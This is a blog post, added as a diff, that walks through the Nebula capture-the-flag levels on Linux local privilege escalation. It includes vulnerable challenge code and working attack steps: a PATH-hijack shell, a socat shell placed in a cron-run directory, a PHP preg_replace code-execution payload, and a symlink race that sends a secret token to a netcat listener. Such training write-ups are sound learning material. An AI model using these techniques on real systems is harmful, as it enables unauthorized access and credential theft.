@@ -1,0 +1,437 @@
+---
+layout: post
+title:  "Exploit Education: Nebula"
+date:   2021-03-01 10:30:56 +0200
+categories: exploiteducation
+---
+
+Nebula is a series of challenges focused on Linux local exploitation. As the author himself says on the website:
+Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at
+
+    SUID files
+    Permissions
+    Race conditions
+    Shell meta-variables
+    $PATH weaknesses
+    Scripting language weaknesses
+    Binary compilation failures
+
+At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
+
+## Level 0 ##
+If we are to search for files with the ```SUID``` bit set we can find the file ```/bin/.../flag00``` among them:
+![find flag00](/assets/images/Nebula/find00.png)
+Executing we are switched to user ```flag00``` and we are prompted to get our flag, finishing the level
+
+![finish00](/assets/images/Nebula/finish00.png)
+
+
+## Level 1 ##
+For the next level we are to exploit a vulnerable binary and we are given its source code
+```cpp
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+```
+This seems to be the executable from ```flag01```'s home directory
+
+![101](/assets/images/Nebula/101.png)
+
+So it looks for the first ```echo``` binary in the current environment's ```PATH``` variable. If we were to execute the binary with a changed ```PATH``` pointing to another ```echo``` binary we can get a shell.
+
+Let's write this short bash script into ```/tmp/echo```:
+```
+#!/bin/bash
+
+/bin/bash
+```
+Give it executable permissions:
+```
+chmod +x /tmp/echo
+```
+And now let's execute it
+
+![102](/assets/images/Nebula/102.png)
+
+
+## Level 2 ##
+Again, we are met with a vulnerable binary:
+```cpp
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char *buffer;
+
+  gid_t gid;
+  uid_t uid;
+
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  buffer = NULL;
+
+  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+  printf("about to call system(\"%s\")\n", buffer);
+  
+  system(buffer);
+}
+```
+This time, we notice it is about command injection, since we can manipulate the name of the user.
+
+![201](/assets/images/Nebula/201.png)
+
+## Level 3 ##
+This time we aren't given a binary, but a bash script that is run as a cronjob:
+
+![301](/assets/images/Nebula/301.png)
+
+This script just executes every file inside ```writable.d```, which means we could make it execute a bind shell to our reverse shell.
+Let's write the following bash script inside of a file in that directory:
+```
+#!/bin/bash
+
+socat TCP:localhost:6969 EXEC:"/bin/bash -li"
+```
+
+Now let's quickly start up our listener and catch the bind shell
+
+![302](/assets/images/Nebula/302.png)
+
+## Level 4 ##
+Another binary, another vulnerability!
+
+```cpp
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;
+
+  if(argc == 1) {
+    printf("%s [file to read]\n", argv[0]);
+    exit(EXIT_FAILURE);
+  }
+
+  if(strstr(argv[1], "token") != NULL) {
+    printf("You may not access '%s'\n", argv[1]);
+    exit(EXIT_FAILURE);
+  }
+
+  fd = open(argv[1], O_RDONLY);
+  if(fd == -1) {
+    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+  }
+
+  rc = read(fd, buf, sizeof(buf));
+  
+  if(rc == -1) {
+    err(EXIT_FAILURE, "Unable to read fd %d", fd);
+  }
+
+  write(1, buf, rc);
+}
+```
+
+It looks like we could make use of it to print ```token```, but it intentionally doesn't allow us to print ```token``` specifically.
+
+![401](/assets/images/Nebula/401.png)
+
+Oh well, nothing a good old symbolic link can't solve!
+
+![402](/assets//images/Nebula/402.png)
+
+## Level 5 ##
+
+No binary this time!
+However, the tar archive inside the ```.backup``` directory is quite suspicious
+
+![501](/assets/images/Nebula/501.png)
+
+Let's unarchive its contents inside ```/tmp``` where we have write permissions.
+
+![502](/assets/images/Nebula/502.png)
+
+Ah, yes! This must be ```flag05```'s private key! Let's use it to ssh into the machine and get the flag.
+
+![503](/assets/images/Nebula/503.png)
+
+## Level 6 ##
+
+As we are told, ```flag06 account credentials came from a legacy unix system.```
+Which means that passwords are stored in ```/etc/passwd```. Knowing this, let's crack that password using ```john```.
+
+![601](/assets/images/Nebula/601.png)
+
+Great! Now that we have the password let's get out flag.
+
+![602](/assets/images/Nebula/602.png)
+
+## Level 7 ##
+
+Next up, we have e ```perl``` script.
+```pl
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("<html><head><title>Ping results</title></head><body><pre>");
+
+  @output = `ping -c 3 $host 2>&1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("</pre></body></html>");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+```
+
+This script is located in the ```index.cgi``` file.
+
+![701](/assets/images/Nebula/701.png)
+
+The contents of ```thttpd.conf``` are also of interest:
+
+![702](/assets/images/Nebula/702.png)
+
+This is clearly vulnerable to command injection through the GET request.
+
+![703](/assets/images/Nebula/703.png)
+
+## Level 8 ##
+This time we are met with a packet capture file.
+Let's copy it to ```/tmp``` where we have write permissions and analyze the capture.
+
+![801](/assets/images/Nebula/801.png)
+
+The first one seems to indicate an incorrect login
+
+![802](/assets/images/Nebula/802.png)
+
+We will find the password in the second capture
+
+![803](/assets/images/Nebula/803.png)
+
+As we can see, the user first typed ```backdoor```, then deleted the last 3 characters and typed ```00R```, then typed ```m8``` then deleted a character and typed ```ate```.
+Thus, our password will be ```backd00Rmate```.
+
+![804](/assets/images/Nebula/804.png)
+
+## Level 9 ##
+
+We are given the following PHP source code
+```php
+<?php
+
+function spam($email)
+{
+  $email = preg_replace("/\./", " dot ", $email);
+  $email = preg_replace("/@/", " AT ", $email);
+  
+  return $email;
+}
+
+function markup($filename, $use_me)
+{
+  $contents = file_get_contents($filename);
+
+  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
+  $contents = preg_replace("/\[/", "<", $contents);
+    $contents = preg_replace("/\]/", ">", $contents);
+
+      return $contents;
+}
+
+$output = markup($argv[1], $argv[2]);
+
+print $output;
+
+?>
+```
+
+From what we can see, it seems to take two command line arguments. The function ```markup``` checks whether the first argument has an email format or not and remove the ```@``` and ```.``` characters.
+This [article](https://www.madirish.net/402) here gives a great explanation of how to properly exploit ```preg_replace```
+The first ```preg_replace``` executes through its second argument, the second matching group, more speciffically, the email address. So, out payload will look something like this:
+```[email {${system('getflag')}}]``` - which I will write in ```/tmp/payload``
+
+![901](/assets/images/Nebula/901.png)
+
+However, the quotes are scaped, guess ```$use_me``` is not useless after all.
+
+![902](/assets/images/Nebula/902.png)
+
+
+## Level 10 ##
+
+We are given the source code for another binary
+
+```cpp
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc < 3) {
+    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
+    exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+  if(access(argv[1], R_OK) == 0) {
+  int fd;
+  int ffd;
+  int rc;
+  struct sockaddr_in sin;
+  char buffer[4096];
+
+  printf("Connecting to %s:18211 .. ", host); fflush(stdout);
+
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  memset(&sin, 0, sizeof(struct sockaddr_in));
+  sin.sin_family = AF_INET;
+  sin.sin_addr.s_addr = inet_addr(host);
+  sin.sin_port = htons(18211);
+
+  if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
+    printf("Unable to connect to host %s\n", host);
+    exit(EXIT_FAILURE);
+  }
+
+#define HITHERE ".oO Oo.\n"
+  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+    printf("Unable to write banner to host %s\n", host);
+    exit(EXIT_FAILURE);
+  }
+#undef HITHERE
+
+  printf("Connected!\nSending file .. "); fflush(stdout);
+
+  ffd = open(file, O_RDONLY);
+  if(ffd == -1) {
+    printf("Damn. Unable to open file\n");
+    exit(EXIT_FAILURE);
+  }
+
+  rc = read(ffd, buffer, sizeof(buffer));
+  if(rc == -1) {
+    printf("Unable to read from file: %s\n", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+
+  write(fd, buffer, rc);
+
+  printf("wrote file!\n");
+
+ } else {
+    printf("You don't have access to %s\n", file);
+ }
+}
+```
+
+From the start we know that we are dealing with a race condition, due to the presence of ```access()```.
+If we are to run multiple instances of the binary concurrently, while changing the file parameter given from a symbolic link to an accessible file, to a symbolic link to ```token```, chances are we are going to get to be allowed to access the contents of ```token```.
+For starters, I am going to write a script that I will background, script which will switch the symbolic links:
+```
+#!/bin/bash
+
+while true; do
+  ln -sf /home/flag10/token /tmp/token;
+  ln -sf /tmp/allowed /tmp/token;
+done
+```
+Where ```/tmp/allowed``` is an empty file we are allowed to read.
+Alright, now from my host machine I will start a concurrent netcat listener:
+```nc -klnvp 18211```
+
+And now, I will try to infinitely run the binary, hoping the race condition will trigger, using this script, which I will run in the foregound:
+```
+#!/bin/bash
+
+while true; do
+  ./flag10 /tmp/token 10.0.2.2;
+done
+```
+
+Anw now, to run the scripts:
+```
+level10@nebula:/home/flag10$ ./tmp/bg.sh &
+level10@nebula:/home/flag10$ ./tmp/fg.sh
+You don't have access to token
+You don't have access to token
+You don't have access to token
+You don't have access to token
+You don't have access to token
+You don't have access to token
+You don't have access to token
+...
+```
+
+Eventually, on our host machine we'll see this:
+```
+Connection from 10.0.2.2 50069 received!
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+Connection from 10.0.2.2 50070 received!
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+Connection from 10.0.2.2 50071 received!
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+Connection from 10.0.2.2 50072 received!
+```
+
+Now, we can use this token to login as ```flag10```:
+```
+level10@nebula:/home/flag10$ su flag10
+Password:
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+```
